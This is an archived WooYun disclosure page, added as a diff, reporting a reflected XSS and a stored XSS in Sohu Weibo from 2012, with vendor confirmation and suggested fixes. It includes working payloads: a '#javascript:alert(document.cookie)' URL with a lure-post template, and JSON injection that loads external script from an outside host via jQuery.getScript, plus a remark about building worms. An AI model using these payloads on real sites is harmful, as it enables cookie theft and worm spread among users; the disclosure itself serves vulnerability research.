@@ -1,0 +1,294 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狐微博：1个内容存储型XSS+1×N个反射型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狐微博：1个内容存储型XSS+1×N个反射型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-05-02 14:34</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-05-02：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-05-12：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-05-22：	细节向普通白帽子公开<br/>
+									2012-06-01：	细节向实习白帽子公开<br/>
+									2012-06-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">之前看到皮鞋啊，老酸奶，胶囊的新闻的时候，看到 郁闷的小崔 在搜狐发的微博， 有个跳转，随手试了下，又看了下源码，没过滤。 <br />
+<br />
+那时候本来打算发到乌云来的， 就看了下搜狐对反射型的XSS的评价，基本都在5分，我想着啊，我这个估计也就能换个5分，就攒着以后再发吧～～ <br />
+<br />
+今天又随手测试了下，发现了另外一个存储型XSS。内容里的哦，危害大家都知道的～～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 漏洞1： 反射型XSS。<br />
+<br />
+<br />
+<br />
+漏洞URL：http://t.sohu.com/m/3398041534 （任何一条微博都可以的啦～～）<br />
+<br />
+<br />
+<br />
+漏洞函数：<br />
+<br />
+<br />
+<br />
+ </p><pre><code>(function() {<br />
+        var originalUrl = window.location.href,<br />
+                toUrl = originalUrl.indexOf(&#039;#&#039;) != -1 &amp;&amp; originalUrl.split(&#039;#&#039;)[1];<br />
+        if (toUrl) {<br />
+            window.location.href = toUrl;<br />
+        }<br />
+    })();</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+URL跳转时候没有过滤 toUrl<br />
+<br />
+<br />
+<br />
+ 漏洞利用， 随便发一条微博，内容为 <br />
+<br />
+让人震撼的XXX电影，史上最强大雷人的阵容， @谁谁谁，@谁谁谁， http://t.sohu.com/m/3398041534/#javascript:alert%28document.cookie%29%3B<br />
+<br />
+<br />
+<br />
+点击即可中招。 具体图片见漏洞证明!<br />
+<br />
+<br />
+<br />
+这第一个漏洞的更强大的位置在于。。<br />
+<br />
+<br />
+<br />
+几乎所有整个搜狐微博的各个页面，都有上面这段漏洞函数。<br />
+<br />
+<br />
+<br />
+比如： http://t.sohu.com/home  （登录后，直接 http://t.sohu.com/home#javascript:alert(document.cookie);可见效果。）<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+因为 http://t.sohu.com/m/\d+ 以及 http://t.sohu.com/.+ 都存在该XSS，<br />
+<br />
+所以俺说 是1×N 个反射型XSS。<br />
+<br />
+<br />
+<br />
+平台：IE及Chrome下均有效。<br />
+<br />
+<br />
+<br />
+Besides, <br />
+<br />
+<br />
+<br />
+相比传统的反射型漏洞，加个&lt;script&gt;xxx&lt;/script&gt;什么的， 容易被IE和其他浏览器自带的防护拦截。<br />
+<br />
+<br />
+<br />
+这种 location.href=&quot;javascript:xxxx&quot; 不会受到这种影响。 所以此洞更有优势。<br />
+<br />
+<br />
+<br />
+-------------------------华丽的分割线-------------------- <br />
+<br />
+<br />
+<br />
+2. 漏洞2：内容存储型XSS。  <br />
+<br />
+<br />
+<br />
+提交微博内容时：pics 字段为JSON数据， JSON数据里的 url 过滤了双引号，但是没过滤单引号。 导致跨站。<br />
+<br />
+<br />
+<br />
+构造以下理由代码： 即在地址后面  xxx.png&#039;,a:(function(){alert(&#039;xx&#039;);})(),b:&#039;<br />
+<br />
+<br />
+<br />
+</p><pre><code>[{&quot;url&quot;:&quot;http://s1.t.itc.cn/mblog/pic/20125_2_12/s_90649467295126824.png&#039;,a:(function(){alert(&#039;xx&#039;);})(),b:&#039;&quot;,&quot;extraData&quot;:{&quot;smallest&quot;:{&quot;w&quot;:64, &quot;h&quot;:64, &quot;size&quot;:1123},&quot;small&quot;:{&quot;w&quot;:64, &quot;h&quot;:64, &quot;size&quot;:1123},&quot;middle&quot;:{&quot;w&quot;:64, &quot;h&quot;:64, &quot;size&quot;:1123},&quot;big&quot;:{&quot;w&quot;:64, &quot;h&quot;:64, &quot;size&quot;:1123}}}]</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+发送此微博后， 其它用户点击内容图片即可触发。<br />
+<br />
+<br />
+<br />
+图片长度有一定限制， 查看了下源码，搜狐微博用了jquery, 直接调用jQuery的getScript函数。调用站外JS。<br />
+<br />
+<br />
+<br />
+</p><pre><code>[{&quot;url&quot;:&quot;http://s1.t.itc.cn/mblog/pic/20125_2_12/s_123.png&#039;,a:(function(){jQuery.getScript(&#039;//xss&#039;+&#039;report.sinaapp.com/1.js&#039;)})(),b:&#039;&quot;,&quot;extraData&quot;:{&quot;smallest&quot;:{&quot;w&quot;:64, &quot;h&quot;:64, &quot;size&quot;:1123},&quot;small&quot;:{&quot;w&quot;:64, &quot;h&quot;:64, &quot;size&quot;:1123},&quot;middle&quot;:{&quot;w&quot;:64, &quot;h&quot;:64, &quot;size&quot;:1123},&quot;big&quot;:{&quot;w&quot;:64, &quot;h&quot;:64, &quot;size&quot;:1123}}}]</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+剩下的事情，就在我们的JS里完成即可咯～～  蠕虫神马的～<br />
+<br />
+<br />
+<br />
+具体效果见图片证明。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/02141842106e03d6dccf6de3f3ff8a7cc35ed707.jpg" target="_blank"><img src="../images/02141842106e03d6dccf6de3f3ff8a7cc35ed707.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0214182908de5b69220af4dae90b4d58b598f4db.jpg" target="_blank"><img src="../images/0214182908de5b69220af4dae90b4d58b598f4db.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/021418068ef2111d8ca69b19e4e59dad69ea8a96.jpg" target="_blank"><img src="../images/021418068ef2111d8ca69b19e4e59dad69ea8a96.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 反射型的那个，修改漏洞函数，对#后面来源的地址拿正则判断下咯。<br />
+<br />
+2. 存储型的这个，过滤url里的单引号 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-06605" title="搜狐微博：1个内容存储型XSS+1×N个反射型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-05-02 14:57</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">thanks.</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="6605";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
